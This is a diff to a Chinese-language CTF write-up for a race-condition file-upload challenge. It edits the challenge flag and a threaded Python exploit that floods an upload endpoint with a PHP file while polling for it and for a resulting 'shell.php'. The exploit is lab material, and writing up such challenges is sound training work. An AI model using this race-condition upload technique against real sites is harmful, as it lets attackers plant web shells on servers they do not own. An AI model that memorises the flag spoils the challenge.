@@ -8,7 +8,7 @@
 2. 条件竞争
 
 - **描述：** newnew的逻辑不太对，只要你够快
-- **flag：** `XSCTF{fi1e_Upl00000000ad_int1r1s7ing_491346}`
+- **flag：** `XSCTF{fi1e_uplooooooooad_intetesting_491346}`
 - **Writeup：** 
 
 1.获取页面源码（3种方法）：
@@ -42,24 +42,29 @@ url = ''
 
 
 def POST1():
-    for i in range(1000):
+    for i in range(50):
         filename = 'a.php'
         file = {"upload_file": open(filename, "rb")}
         r = requests.post(url=url + 'Upl00000000ad.php', data={'submit': 'True'}, files=file)
 
-        print(r.text)
+        # print(r.text)
 
 
 def POST2():
-    for i in range(1000):
+    for i in range(50):
         r = requests.get(url=url + 'uploads/a.php')
         if r.status_code == 200:
-            print('ok')
-        print(r)
+            r=requests.get(url=url+'uploads/shell.php')
+            if r.status_code==200:
+                print('ok')
+                break
+        # print(r.text)
+
 
 
 threading.Thread(target=POST1).start()
 threading.Thread(target=POST2).start()
+
 
 ```
 
